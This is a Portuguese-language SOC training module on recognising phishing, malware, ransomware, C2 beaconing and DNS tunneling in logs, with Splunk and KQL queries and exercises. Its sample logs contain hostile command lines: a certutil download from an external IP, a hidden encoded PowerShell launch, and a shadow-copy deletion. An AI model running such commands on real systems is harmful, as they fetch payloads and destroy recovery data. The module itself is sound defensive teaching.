# Módulo 14 — Ameaças comuns que o SOC vê todo dia

## Por que este módulo importa para o SOC

Um analista de SOC (Security Operations Center, ou "Centro de Operações de Segurança") Nível 1 não precisa saber escrever um ataque — precisa reconhecer o **rastro** que o ataque deixa nos logs. Quase todo incidente grave começa pequeno: um e-mail que alguém abriu, um anexo que rodou, uma senha que vazou. Este módulo ensina a identificar essas ameaças pelo comportamento visível na rede e nos eventos do sistema, decidir em poucos minutos se é verdadeiro ou falso positivo, e saber a hora exata de escalar.

**Índice do módulo:**

- Phishing e malware
- Ransomware, Command and Control e DNS tunneling
- Exfiltração, movimento lateral, brute force e password spraying
- Outras ameaças e a tabela mestra de triagem

---

## Phishing

### O que é

Imagine um golpista que se veste de carteiro, toca a campainha e diz "preciso confirmar seu endereço". Ele não arrombou nada: você abriu a porta. **Phishing** ("pescaria", em inglês) é exatamente isso — uma mensagem que se disfarça de algo confiável para que a própria vítima entregue a senha, aprove um acesso ou execute um arquivo.

**Variantes que você vai ver nos alertas:**

| Variante | Como se diferencia |
|---|---|
| Phishing em massa | Mesma mensagem para milhares de pessoas |
| Spear phishing | Personalizado para uma pessoa ou setor específico |
| Whaling | Alvo é executivo (CEO, CFO), geralmente pedindo transferência |
| Smishing | Chega por SMS |
| Vishing | Chega por ligação telefônica ou áudio |
| Quishing | O link malicioso está dentro de um QR Code numa imagem |
| MFA fatigue | Bombardeio de aprovações push até a vítima clicar "sim" por cansaço |
| AiTM (Adversary in the Middle) | Site falso que fica no meio, repassa tudo ao site real e **rouba o cookie de sessão**, derrotando o segundo fator |

O AiTM é o mais perigoso hoje: como o atacante captura o cookie de sessão já autenticado, o MFA (Multi-Factor Authentication, autenticação de múltiplos fatores) não protege.

### Como acontece na prática (passo a passo conceitual)

1. O atacante registra um domínio parecido com o da empresa — `empresa-exemplo.com.br` vira `empresa-exemp1o.com.br`.
2. Monta uma página de login idêntica à real.
3. Envia o e-mail com um pretexto urgente ("sua senha expira hoje").
4. A vítima clica, digita usuário e senha na página falsa.
5. O atacante usa a credencial (ou o cookie de sessão) para entrar no ambiente real.
6. A partir daí vira outro problema: acesso indevido, envio de e-mails internos e persistência.

### Onde deixa rastro

- **Gateway de e-mail** (cabeçalhos, resultado de SPF/DKIM/DMARC).
- **Proxy/DNS** — a consulta e o acesso ao domínio falso.
- **Firewall de borda** — a sessão HTTPS para o IP do site falso.
- **Identidade** — login bem-sucedido de país ou dispositivo incomum logo após o clique.

### Análise de cabeçalho de e-mail

Todo e-mail carrega um "envelope" com carimbos de cada servidor por onde passou. Ler esse envelope é a habilidade mais rentável do N1.

```text
Received: from mail.corp.local (10.10.20.15) by mx01.corp.local
          with ESMTPS; Tue, 02 Sep 2026 09:14:22 -0300
Received: from vps-4471.hostbarato.example (203.0.113.77)
          by mail.corp.local; Tue, 02 Sep 2026 09:14:19 -0300
Return-Path: <bounce@hostbarato.example>
From: "TI Suporte" <suporte@empresa-exemp1o.com.br>
Reply-To: recuperacao-acesso@mail.example
To: jsilva@empresa-exemplo.com.br
Subject: [URGENTE] Sua senha expira em 2 horas
Authentication-Results: mx01.corp.local;
    spf=fail (sender IP 203.0.113.77) smtp.mailfrom=hostbarato.example;
    dkim=none;
    dmarc=fail (p=quarantine) header.from=empresa-exemp1o.com.br
```

**Como ler campo a campo:**

| Campo | O que significa | Sinal aqui |
|---|---|---|
| `Received` | Carimbo de cada salto; leia **de baixo para cima** | Origem real é `203.0.113.77`, um VPS aleatório |
| `Return-Path` | Para onde volta o erro de entrega | Domínio diferente do `From` |
| `From` | O que o usuário vê | `exemp1o` com o número 1 no lugar do "l" |
| `Reply-To` | Para onde vai a resposta | Domínio totalmente distinto — clássico de fraude |
| `spf=fail` | SPF (Sender Policy Framework): o IP não tem permissão para enviar por aquele domínio | Falhou |
| `dkim=none` | DKIM (DomainKeys Identified Mail): assinatura criptográfica ausente | Sem assinatura |
| `dmarc=fail` | DMARC junta SPF+DKIM e diz o que fazer | Falhou, política de quarentena |

**Regra de ouro:** `spf=fail` **e** `dkim=none` **e** `From` diferente de `Reply-To` = altíssima suspeita.

### Análise de URL e de anexo

- **URL:** compare o domínio registrável (as duas últimas partes antes da barra). `contas.empresa-exemplo.com.br.login-seguro.example` **não** é da empresa — o domínio real é `login-seguro.example`.
- **Anexo:** desconfie de `.html` que abre formulário de login, `.iso`/`.img`/`.zip` protegido por senha citada no corpo do e-mail, e documentos com macro. Nunca abra na sua estação: use sandbox corporativa.

### Como identificar em log

Proxy Squid registrando o acesso ao domínio falso:

```text
1756814089.412   3120 10.10.32.51 TCP_TUNNEL/200 5821 CONNECT
empresa-exemp1o.com.br:443 jsilva HIER_DIRECT/203.0.113.77 -
```

Campos: epoch, duração em ms, IP do cliente, resultado/código HTTP, bytes, método, destino, usuário autenticado, IP de destino.

Query SPL (Splunk):

```spl
index=proxy sourcetype=squid
| eval dominio=lower(replace(dest, ":\d+$", ""))        `# tira a porta do destino`
| search dominio IN ("empresa-exemp1o.com.br","login-seguro.example")
| stats count values(user) as usuarios min(_time) as primeiro by dominio, src_ip
| convert ctime(primeiro)                                `# deixa a data legível`
```

Query KQL (Microsoft Sentinel / Defender):

```kql
EmailEvents
| where TimeGenerated > ago(24h)
| where SenderFromDomain != "empresa-exemplo.com.br"     // remetente externo
| where Subject has_any ("expira", "URGENTE", "verifique sua conta")
| where AuthenticationDetails has "spf=fail" or AuthenticationDetails has "dmarc=fail"
| project TimeGenerated, SenderFromAddress, RecipientEmailAddress, Subject, DeliveryAction
| order by TimeGenerated desc
```

### Indicadores (IOC / IOA)

- **IOC (indicador de comprometimento, o "quê"):** domínio typosquatting, IP `203.0.113.77`, hash do anexo, URL da página falsa.
- **IOA (indicador de ataque, o "comportamento"):** e-mail externo com `Reply-To` divergente, clique seguido de login de outro país em menos de 10 minutos, criação de regra de caixa de entrada que move mensagens para "Itens Excluídos".

### Falsos positivos típicos

- Ferramenta de marketing legítima enviando pelo domínio da empresa sem estar no SPF.
- Campanha interna de conscientização (simulação de phishing) — confirme antes de abrir incidente.
- Fornecedor que responde de outro domínio corporativo, gerando `Reply-To` diferente.

### Ação do SOC N1 nos primeiros 15 minutos

1. Confirmar se a mensagem foi **entregue** ou bloqueada.
2. Levantar todos os destinatários que receberam o mesmo assunto/remetente.
3. Verificar no proxy quem **clicou**.
4. Para quem clicou, checar logins recentes desse usuário (país, dispositivo, novo MFA).
5. Solicitar bloqueio de URL/domínio e purga da mensagem das caixas.

**Escale imediatamente se:** houve login bem-sucedido após o clique, cookie de sessão suspeito, criação de regra de encaminhamento externo, ou alvo executivo com pedido financeiro.

### Erro comum de analista júnior

Fechar o caso porque "o e-mail foi bloqueado". Bloqueado para um destinatário não significa bloqueado para todos — sempre busque a campanha inteira.

**MITRE ATT&CK:** T1566 (Phishing), T1566.001 (anexo), T1566.002 (link), T1598 (Phishing for Information), T1621 (Multi-Factor Authentication Request Generation), T1539 (Steal Web Session Cookie).

---

## Malware

### O que é

Malware é qualquer programa escrito para prejudicar. A analogia: um funcionário terceirizado com crachá válido que, uma vez dentro do prédio, copia documentos e abre a porta dos fundos.

| Tipo | O que faz |
|---|---|
| Trojan | Finge ser útil, executa algo malicioso |
| Worm | Se copia sozinho pela rede, sem clique |
| RAT (Remote Access Trojan) | Dá controle remoto interativo da máquina |
| Infostealer | Rouba senhas salvas, cookies e carteiras |
| Loader / Dropper | Só serve para baixar e executar o malware seguinte |
| Rootkit | Se esconde no sistema para não ser visto |
| Cryptominer | Usa a CPU da vítima para minerar criptomoeda |

### Malware fileless e living-off-the-land

**Fileless** significa "sem arquivo": o código roda na memória, sem gravar um executável no disco — então o antivírus tradicional, que procura arquivos, vê menos. Para isso o atacante usa **LOLBins** (Living Off the Land Binaries), que são programas **legítimos do próprio Windows** desviados de função:

| Binário legítimo | Função normal | Abuso observado |
|---|---|---|
| `powershell.exe` | Automação administrativa | Executar código codificado em memória |
| `mshta.exe` | Executar arquivos HTA | Rodar script remoto |
| `rundll32.exe` | Chamar funções de DLL | Carregar DLL maliciosa |
| `regsvr32.exe` | Registrar componentes | Executar script remoto ("Squiblydoo") |
| `certutil.exe` | Gerenciar certificados | Baixar e decodificar arquivo |
| `wmic.exe` | Consultar WMI | Executar processo remoto |
| `bitsadmin.exe` | Transferência em segundo plano | Baixar carga útil |

### Como aparece nos logs

Evento **4688** do Windows Security (criação de processo):

```text
EventID: 4688
New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Creator Process Name: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
Account Name: jsilva
Token Elevation Type: %%1936
Process Command Line: powershell -nop -w hidden -enc <cadeia base64 removida>
```

Sysmon **Event ID 1** (Process Create) traz mais contexto:

```text
EventID: 1
Image: C:\Windows\System32\certutil.exe
ParentImage: C:\Windows\System32\cmd.exe
CommandLine: certutil -urlcache -f hxxp://203.0.113.90/a.txt a.txt
User: CORP\jsilva
Hashes: SHA256=<hash fictício>
```

**O que o N1 observa (normal vs suspeito):**

| Sinal | Normal | Suspeito |
|---|---|---|
| Pai do PowerShell | `explorer.exe`, `cmd.exe` de admin | `WINWORD.EXE`, `EXCEL.EXE`, `OUTLOOK.EXE` |
| Flags | Script assinado, caminho conhecido | `-nop -w hidden -enc` |
| `certutil` | Executado por equipe de PKI | Com `-urlcache` apontando para IP externo |
| Usuário | Conta administrativa nomeada | Conta de usuário comum |

Query SPL:

```spl
index=windows (EventCode=4688 OR source="*Sysmon*" EventCode=1)
| search parent_process_name IN ("WINWORD.EXE","EXCEL.EXE","OUTLOOK.EXE")
  process_name IN ("powershell.exe","mshta.exe","wscript.exe","regsvr32.exe")
| stats count by host, user, parent_process_name, process_name, process
| sort - count                                          `# concentra o que mais repete`
```

Query KQL:

```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","outlook.exe")
| where FileName in~ ("powershell.exe","mshta.exe","regsvr32.exe","certutil.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

### Indicadores (IOC / IOA)

- **IOC:** hash SHA256 do binário, IP `203.0.113.90`, nome de arquivo em `%TEMP%`, chave de execução automática.
- **IOA:** Office gerando processo de script; `certutil` baixando conteúdo; processo assinado carregando DLL de pasta de usuário; conexão de saída logo após criação do processo.

### Falsos positivos típicos

- Ferramenta de inventário ou de deploy que usa PowerShell e WMI legitimamente (ex.: conta `svc_backup`).
- Macro corporativa antiga aprovada pelo negócio.
- Scanner de vulnerabilidade autenticado, que dispara vários processos remotos.

### Ação do SOC N1 nos primeiros 15 minutos

1. Identificar host, usuário e horário exato.
2. Levantar a árvore de processos (pai e filhos).
3. Verificar conexões de saída daquele host nos minutos seguintes (firewall/proxy).
4. Checar se o hash já é conhecido nas fontes de inteligência aprovadas.
5. Verificar se o mesmo padrão aparece em outros hosts (sinal de campanha).

**Escale se:** houve conexão externa estabelecida, execução com privilégio elevado, mais de um host afetado, ou indício de coleta de credenciais. Isolamento de máquina é decisão do N2/N3 conforme a política — o N1 recomenda e registra.

### Erro comum de analista júnior

Confiar no nome do processo. `powershell.exe` é legítimo; o que denuncia o ataque é **quem o chamou** e **com quais argumentos**.

**MITRE ATT&CK:** T1204 (User Execution), T1204.002 (Malicious File), T1059.001 (PowerShell), T1059.005 (Visual Basic), T1218 (System Binary Proxy Execution), T1218.010 (Regsvr32), T1218.011 (Rundll32), T1105 (Ingress Tool Transfer), T1055 (Process Injection), T1555 (Credentials from Password Stores).

---

### Exercícios — Phishing e malware

1. No cabeçalho dissecado acima, cite **três** evidências independentes de que o e-mail é fraudulento e explique cada uma em uma frase.
2. Um alerta mostra `EventID 4688` com `New Process Name: powershell.exe` e `Creator Process Name: C:\Program Files\SCCM\ccmexec.exe`, usuário `svc_backup`, às 03h10, em 400 máquinas. Verdadeiro ou falso positivo? Justifique.
3. O proxy registra `TCP_TUNNEL/200 ... CONNECT contas.empresa-exemplo.com.br.login-seguro.example:443 maria.costa`. Qual é o domínio realmente acessado e por que isso importa?
4. Após um clique confirmado em phishing AiTM, o login do usuário aparece como **bem-sucedido e com MFA satisfeito**. Isso descarta o incidente? Qual o próximo passo da investigação?
5. Escreva, em linguagem própria, qual campo do Sysmon Event ID 1 você usaria primeiro para separar `certutil.exe` legítimo de abuso, e por quê.

<details><summary>Ver gabarito</summary>

**1.** (a) `spf=fail` — o IP `203.0.113.77` não está autorizado a enviar pelo domínio alegado; (b) `dkim=none` somado a `dmarc=fail` — não há assinatura criptográfica e a política do domínio foi violada; (c) `From` mostra `empresa-exemp1o.com.br` (typosquatting, "1" no lugar do "l") enquanto `Reply-To` aponta para `recuperacao-acesso@mail.example`, domínio sem relação nenhuma. Bônus: o primeiro `Received` de baixo revela origem em VPS genérico.

**2.** Falso positivo altamente provável. O processo pai é o agente de gerenciamento (`ccmexec.exe`), a conta é de serviço (`svc_backup`), o horário é de janela de manutenção e a execução é ampla e uniforme — comportamento típico de deploy. O correto é confirmar com a equipe de infraestrutura e propor exceção documentada (por pai + conta + janela), nunca suprimir só pelo nome `powershell.exe`.

**3.** O domínio registrável é `login-seguro.example`. Tudo que vem antes são apenas subdomínios que o atacante escolheu para imitar a empresa. Importa porque a leitura correta é da direita para a esquerda: quem controla o certificado e o conteúdo é o dono de `login-seguro.example`, não a empresa.

**4.** Não descarta — pelo contrário, reforça. Em AiTM o atacante rouba o **cookie de sessão** já autenticado, então o login legítimo aparece "MFA satisfeito". Próximos passos: comparar IP, ASN, país e user agent do login com a linha de base do usuário; revogar todas as sessões ativas; forçar troca de senha e reregistro de MFA; procurar regras novas de caixa de entrada e encaminhamento externo; escalar para N2. Técnicas: T1539 e T1550.

**5.** O campo `CommandLine`. O nome (`Image`) é sempre o mesmo binário assinado da Microsoft; o que separa uso legítimo de abuso são os argumentos — `-urlcache -f` com uma URL/IP externo indica download de carga útil (T1105). O segundo campo mais útil é `ParentImage`, para ver se quem chamou foi uma ferramenta de PKI ou um `cmd.exe` nascido de um documento.

</details>


## Ransomware — o sequestro dos arquivos

### O que é

Imagine que alguém entra na sua casa, troca a fechadura de todos os cômodos e deixa um bilhete na porta: "quer as chaves? pague". É exatamente isso que o **ransomware** faz com os arquivos da empresa. Ele embaralha (criptografa) documentos, planilhas e bancos de dados, e o criminoso vende a chave que desembaralha.

Um detalhe importante: hoje o ransomware quase nunca é só criptografia. Antes de embaralhar, o atacante **copia os dados para fora** e ameaça publicá-los. Isso se chama **dupla extorsão** — você paga para recuperar os arquivos *e* paga para não ver os dados vazados na internet.

### Como funciona — a cadeia completa

O momento da criptografia é o **fim** da história. Para o SOC, o que importa são os dias (às vezes semanas) anteriores.

| Etapa | O que o atacante faz | Código MITRE ATT&CK |
|---|---|---|
| 1. Acesso inicial | Phishing com anexo, credencial vazada usada em VPN/RDP sem MFA, exploração de serviço exposto | T1566, T1078, T1190 |
| 2. Execução | Roda um carregador (loader) na máquina da vítima | T1059 |
| 3. Persistência | Cria tarefa agendada, serviço ou chave de execução automática para sobreviver ao reboot | T1053, T1543 |
| 4. Escalada de privilégio | Vira administrador local, depois administrador de domínio | T1068, T1134 |
| 5. Descoberta | Mapeia o Active Directory e os compartilhamentos de rede (ferramentas tipo BloodHound deixam rastro de milhares de consultas LDAP) | T1087, T1069 |
| 6. Movimento lateral | Usa SMB, WMI, RDP ou PsExec para alcançar servidores | T1021 |
| 7. Exfiltração | Envia gigabytes para nuvem ou servidor externo (dupla extorsão) | T1567 |
| 8. Impacto | Apaga shadow copies, para serviços de backup e antivírus, criptografa tudo | T1490, T1489, T1486 |

**Analogia:** o ladrão primeiro faz uma cópia da chave (credencial), depois anda pela casa toda anotando o que tem de valor (descoberta), carrega o caminhão (exfiltração), corta a linha do alarme (backup e shadow copies) e só então troca as fechaduras (criptografia).

> Sobre a etapa 1 (phishing e malware) e a etapa 7 (exfiltração e movimento lateral), veja os trechos específicos deste módulo.

### Exemplo prático

Na `empresa-exemplo.com.br`, às 02h14 a conta de serviço `svc_backup` — que normalmente só fala com o servidor de backup — inicia sessões em 18 servidores diferentes em 6 minutos. Em seguida, na estação `WKS-FIN-042` (10.10.20.42), aparecem comandos apagando cópias de sombra do Windows.

### Como aparece nos logs

Os **sinais precoces** são os mais valiosos. Este é o mais clássico — apagamento de VSS (Volume Shadow Copy Service, o recurso do Windows que guarda versões anteriores dos arquivos), visto no **Windows Security 4688** (criação de processo):

```
04/09/2026 02:14:57 LogName=Security EventID=4688
Message=A new process has been created.
  Creator Subject:
    Account Name:       svc_backup
    Account Domain:     CORP
  Process Information:
    New Process Name:   C:\Windows\System32\vssadmin.exe
    Token Elevation Type: TokenElevationTypeFull (1)
    Creator Process Name: C:\Windows\System32\cmd.exe
    Process Command Line: vssadmin.exe delete shadows /all /quiet
```

Campos que importam: `New Process Name` diz **qual binário rodou**; `Process Command Line` diz **com quais argumentos** (só aparece se a auditoria de linha de comando estiver ativada — cobrimos isso no Módulo 8); `Creator Process Name` diz **quem chamou**, e `cmd.exe` chamando `vssadmin` fora de janela de manutenção é anormal.

Logo depois, a parada de serviços de backup e antivírus:

```
EventID=7036 Source=Service Control Manager
  The Veeam Backup Service service entered the stopped state.
EventID=7036 Source=Service Control Manager
  The Windows Defender Antivirus Service service entered the stopped state.
```

E a rajada de escrita e renomeação em massa, vista no **Sysmon Event ID 11 (FileCreate)** e no compartilhamento SMB:

```
Sysmon EventID=11 FileCreate
  Image: C:\Users\Public\svc-host32.exe
  TargetFilename: \\FS-01\Financeiro\2026\balanco_Q2.xlsx.lckd
  User: CORP\svc_backup
```

O sufixo novo (`.lckd`) em milhares de arquivos, sempre pelo mesmo processo, é a assinatura da criptografia em andamento.

Consulta de agregação para pegar a rajada de escrita SMB (SPL, Splunk):

```spl
index=windows EventCode=5145 Object_Type=File Accesses="*WriteData*"
| bin _time span=1m
| stats dc(Object_Name) AS arquivos BY _time, Account_Name, Source_Address
| where arquivos > 500
| sort - arquivos
```

Linha a linha: a primeira filtra apenas acessos de escrita em arquivos (EventID 5145 é o acesso detalhado a compartilhamento de rede); a segunda fatia o tempo em janelas de 1 minuto; a terceira conta quantos **arquivos distintos** cada conta tocou, por endereço de origem; a quarta mantém só quem passou de 500 arquivos por minuto — volume que nenhum usuário humano produz; a quinta ordena do pior para o menos grave.

Equivalente em KQL (Microsoft Sentinel / Defender):

```kql
DeviceFileEvents
| where ActionType in ("FileCreated","FileRenamed")
| summarize arquivos = dcount(FileName) by bin(Timestamp, 1m), DeviceName, InitiatingProcessAccountName
| where arquivos > 500
| order by arquivos desc
```

### O que o SOC N1 observa

| Normal | Suspeito |
|---|---|
| `vssadmin list shadows` por ferramenta de backup homologada | `vssadmin delete shadows /all /quiet` por qualquer processo |
| Serviço de backup parando na janela de manutenção documentada | Backup e antivírus parando juntos, de madrugada, sem mudança aprovada |
| Conta de serviço falando com 1 ou 2 servidores | `svc_backup` autenticando em dezenas de hosts (4624 tipo 3) em minutos |
| Usuário salvando 20 arquivos por hora | 5.000 arquivos renomeados em 3 minutos pelo mesmo processo |

**O que o N1 faz PRIMEIRO: isolar o host.** Não é investigar, não é abrir chamado, não é pedir print ao usuário. Contenção de rede (isolamento pelo EDR ou bloqueio na porta do switch), **sem desligar a máquina** — desligar destrói memória volátil e pode interromper a criptografia no pior ponto. Depois disso: bloquear a conta comprometida, notificar o N2/plantão e preservar os logs.

### Erro comum de analista junior

Tratar o alerta de "vssadmin delete shadows" como ruído porque "o servidor é de backup, mexe com shadow copy o tempo todo". A diferença está no **verbo** (`list` versus `delete`), no processo-pai e no horário. Outro erro: pedir ao usuário para reiniciar a máquina "para ver se resolve" — isso apaga evidência e acelera o dano.

## Command and Control (C2) — o rádio do invasor

### O que é

**Command and Control**, ou C2 (em português, comando e controle), é o canal pelo qual a máquina infectada recebe ordens. A analogia: o ladrão já colocou um rádio dentro da sua casa e, a cada X minutos, o rádio chama a central perguntando "tem alguma ordem para mim?".

A máquina infectada é quem **inicia** a conversa — de dentro para fora. É por isso que o firewall de borda raramente barra: para ele, é só mais uma saída HTTPS.

### Canais mais usados

| Canal | Porta típica | Por que o atacante gosta | Onde o SOC olha |
|---|---|---|---|
| HTTP / HTTPS | 80 / 443 | Sempre liberado, some no meio do tráfego web | Proxy, Zeek `http.log` / `ssl.log` |
| DNS | 53 (UDP/TCP) | Quase nunca bloqueado, resolve mesmo em rede restrita | Zeek `dns.log`, log do servidor DNS |
| ICMP | — (tipo 8/0) | Passa em rede permissiva; payload grande em ping é anômalo | Firewall, Zeek `icmp` |
| Serviços legítimos de nuvem | 443 | Domínio confiável, certificado válido, reputação boa | CASB (Netskope/Zscaler), volume por app |

O último caso é o mais difícil: o C2 se hospeda em serviço de armazenamento ou colaboração público e o destino parece idôneo. Nesse cenário, o sinal deixa de ser "para onde vai" e passa a ser **o padrão temporal**.

### Beaconing — o batimento cardíaco

**Beaconing** é o "alô, central" repetido. Três características o denunciam:

1. **Intervalo (sleep):** o retorno acontece a cada N segundos — 60, 300, 3600. Comunicação humana nunca é assim regular.
2. **Jitter:** variação aleatória proposital em cima do intervalo (por exemplo, 20% sobre 300s = entre 240s e 360s). Mesmo com jitter, o **desvio padrão continua pequeno** perto do intervalo médio.
3. **Tamanho constante:** cada requisição sem tarefa nova envia praticamente o mesmo número de bytes (a "pergunta" é sempre a mesma). Navegação real tem tamanhos muito variados.

### Como aparece nos logs

Zeek `conn.log` (campos: horário, IPs e portas de origem/destino, protocolo, duração, bytes originados `orig_bytes` e respondidos `resp_bytes`):

```
ts                   uid       id.orig_h    id.orig_p  id.resp_h      id.resp_p proto service duration orig_bytes resp_bytes conn_state
2026-09-04T09:00:12Z CxA1b2    10.10.20.42  50122      203.0.113.77   443       tcp   ssl     0.412    417        1290       SF
2026-09-04T09:05:14Z CxA1b3    10.10.20.42  50188      203.0.113.77   443       tcp   ssl     0.398    417        1290       SF
2026-09-04T09:10:11Z CxA1b4    10.10.20.42  50231      203.0.113.77   443       tcp   ssl     0.405    419        1290       SF
2026-09-04T09:15:13Z CxA1b5    10.10.20.42  50290      203.0.113.77   443       tcp   ssl     0.401    417        1288       SF
```

Leia a coluna `ts`: 09:00:12, 09:05:14, 09:10:11, 09:15:13 — sempre ~300 segundos. E `orig_bytes` praticamente idêntico. Isso é máquina, não pessoa.

Query de agregação pronta para achar periodicidade (SPL):

```spl
index=zeek sourcetype=zeek:conn dest_port=443
| sort 0 src_ip, dest_ip, _time
| streamstats current=f last(_time) AS anterior BY src_ip, dest_ip
| eval delta = _time - anterior
| stats count AS conexoes avg(delta) AS media stdev(delta) AS desvio avg(orig_bytes) AS bytes_medio BY src_ip, dest_ip
| where conexoes > 20 AND media > 30 AND desvio < (media * 0.15)
| eval jitter_pct = round((desvio/media)*100, 1)
| sort - conexoes
```

Cada etapa: ordena por par origem-destino e tempo; pega o horário da conexão anterior do mesmo par; calcula o intervalo entre conexões (`delta`); resume contagem, intervalo médio, desvio padrão e bytes médios; e mantém só pares com muitas conexões e desvio menor que 15% da média — ou seja, ritmo de relógio.

Mesma lógica em KQL:

```kql
DeviceNetworkEvents
| where RemotePort == 443 and isnotempty(RemoteIP)
| order by DeviceName, RemoteIP, Timestamp asc
| serialize
| extend delta = datetime_diff('second', Timestamp, prev(Timestamp))
| summarize conexoes=count(), media=avg(delta), desvio=stdev(delta) by DeviceName, RemoteIP
| where conexoes > 20 and media > 30 and desvio < media * 0.15
```

### Domain fronting (conceito)

Em nível conceitual: é a técnica em que o **nome que o firewall enxerga** na negociação da conexão e o **destino real** dentro do túnel cifrado são diferentes, aproveitando infraestruturas compartilhadas de distribuição de conteúdo. Para o N1, a lição prática é: destino de boa reputação **não** encerra a investigação — quando o padrão temporal grita beacon, escale.

### O que o SOC N1 observa

| Normal | Suspeito |
|---|---|
| Intervalos irregulares, rajadas quando o usuário navega | Intervalo fixo por horas, inclusive de madrugada e no fim de semana |
| Tamanhos de resposta muito variados | `orig_bytes` quase constante em centenas de conexões |
| Trânsito para domínios usados por muitos hosts | Um único host falando com um destino que ninguém mais acessa |

### Erro comum de analista junior

Fechar o alerta porque "o IP não está em nenhuma lista de reputação". Infraestrutura de C2 é descartável e nasce limpa. O sinal aqui é **comportamental**, não reputacional.

## DNS tunneling — mensagem escondida na consulta de nome

### O que é

O DNS (Domain Name System, o serviço que traduz nome em endereço IP) é a lista telefônica da internet. No **DNS tunneling**, o atacante escreve o recado dentro do próprio "nome consultado" — como quem passa bilhetes usando o formulário de pedido da portaria, porque a portaria nunca lê o conteúdo, só encaminha.

O mecanismo completo está no **Módulo 5 (DNS)**; aqui o foco é detecção e limiar.

### Como aparece nos logs

Zeek `dns.log` (campos: horário, cliente, servidor, nome consultado `query`, tipo de registro `qtype_name`, código de resposta `rcode_name`):

```
ts                   id.orig_h    id.resp_h   query                                                        qtype_name rcode_name
2026-09-04T11:02:03Z 10.10.20.42  10.10.0.10  k3j9x2mq7fp1a8vd0slz.tun.example.com                          TXT        NOERROR
2026-09-04T11:02:04Z 10.10.20.42  10.10.0.10  b7c2ne5rq0yt4hgw9lxk.tun.example.com                          TXT        NOERROR
2026-09-04T11:02:04Z 10.10.20.42  10.10.0.10  z1p8dv6ma3ck7ju2wnqe.tun.example.com                          TXT        NOERROR
```

Três pistas em uma linha só: subdomínio longo e sem sentido, tipo `TXT` (que carrega texto livre, ideal para dados) e cadência altíssima do mesmo cliente para o mesmo domínio-pai.

### Limiares práticos de triagem

| Indicador | Faixa normal | Investigar |
|---|---|---|
| Comprimento do rótulo à esquerda | até ~20 caracteres | acima de 40, ou próximo de 63 (máximo do rótulo) |
| Consultas por host, por domínio-pai, por hora | dezenas | centenas ou milhares |
| Proporção de `TXT` / `NULL` sobre o total do host | < 5% | > 20% |
| Subdomínios distintos por domínio-pai | poucos e repetidos | quase 100% únicos |
| Volume de bytes em DNS por host/dia | poucos MB | dezenas de MB |

```spl
index=zeek sourcetype=zeek:dns
| eval parent = mvindex(split(query,"."), -2) . "." . mvindex(split(query,"."), -1)
| eval sub = mvindex(split(query,"."), 0), tam = len(sub)
| stats count AS consultas dc(sub) AS subs_unicos avg(tam) AS tam_medio BY src_ip, parent
| eval unicidade = round(subs_unicos/consultas, 2)
| where consultas > 200 AND unicidade > 0.9 AND tam_medio > 30
```

As linhas extraem o domínio-pai e o rótulo mais à esquerda, medem o tamanho médio desse rótulo, contam consultas e subdomínios distintos, calculam a taxa de unicidade e mantêm só o que é volumoso, quase todo único e comprido.

### O que o SOC N1 observa

Normal: um host consulta muitos domínios diferentes, com nomes legíveis e repetidos, tipos `A`/`AAAA`/`HTTPS`. Suspeito: um host consulta **um único** domínio-pai milhares de vezes, com subdomínios sempre novos e ilegíveis.

### Erro comum de analista junior

Confundir com antivírus e serviços de reputação, que legitimamente usam consultas DNS com aparência de hash. A diferença: o domínio-pai é do fornecedor conhecido, o comportamento aparece em **toda a frota** e o volume por host é baixo. Um host sozinho com esse padrão é o alerta real.

### Exercícios — Ransomware, Command and Control e DNS tunneling

1. **Cálculo de jitter.** Um host se conecta a `198.51.100.20:443` com intervalos de 282s, 318s, 295s, 306s e 299s. Calcule o intervalo médio e diga se o par passa no filtro `desvio < 15% da média` usado na query SPL de beaconing.
2. **Leitura de log.** No 4688 da seção de ransomware, três campos justificam a escalada. Nomeie os três e explique o que cada um prova.
3. **Verdadeiro ou falso positivo?** Alerta: "DNS tunneling suspeito — 3.100 consultas TXT em 1 hora". Investigando, você vê 41 hosts distintos consultando o mesmo domínio-pai de um fabricante de antivírus, média de 75 consultas por host. Verdadeiro ou falso positivo? Justifique com dois indicadores da tabela de limiares.
4. **Próximo passo.** Às 03h07, `admin.rodrigo` roda `vssadmin delete shadows /all /quiet` em `SRV-APP-07` (10.10.30.7) e, 2 minutos depois, o serviço de backup para. Liste, em ordem, as três primeiras ações do N1.
5. **Priorização.** Você tem, na mesma fila: (a) beaconing de 300s de um host para IP sem reputação ruim; (b) 4.000 arquivos renomeados em 2 minutos em `\\FS-01`; (c) 60 consultas DNS TXT de um host. Ordene por prioridade e justifique a primeira.

<details><summary>Ver gabarito</summary>

**1.** Soma = 282+318+295+306+299 = 1500; média = 1500/5 = **300s**. Desvios em relação à média: −18, +18, −5, +6, −1. Quadrados: 324, 324, 25, 36, 1 = 710; dividido por 5 = 142; raiz ≈ **11,9s**. O limiar é 15% de 300 = 45s. Como 11,9 < 45, o par **passa no filtro** e deve ser tratado como beaconing candidato (jitter ≈ 4%). Repare que jitter baixo não é prova de malware — é prova de que a comunicação é automatizada; o próximo passo é identificar o processo responsável.

**2.** (i) `Process Command Line` com `delete shadows /all /quiet` — prova a **intenção destrutiva**, não é uma listagem inofensiva; (ii) `Account Name: svc_backup` combinado ao horário 02h14 — conta de serviço agindo fora do seu comportamento e da janela aprovada; (iii) `Creator Process Name: cmd.exe` — a ferramenta de backup homologada não invoca `vssadmin` através de um shell interativo, então a cadeia de processos está errada. Juntos, os três descrevem T1490 (Inhibit System Recovery).

**3.** **Falso positivo.** Dois indicadores desmentem o tunneling: (i) o padrão aparece em **41 hosts**, e tunneling de C2 costuma ser de um host isolado; (ii) o **volume por host é baixo** (75 consultas/hora, dentro da faixa "dezenas") e o domínio-pai pertence a um fornecedor conhecido de segurança, cujas consultas de reputação usam rótulos com aparência de hash por desenho. Ação correta: documentar, propor exceção por domínio-pai (não por host) e ajustar o limiar para disparar por host, não pelo total agregado.

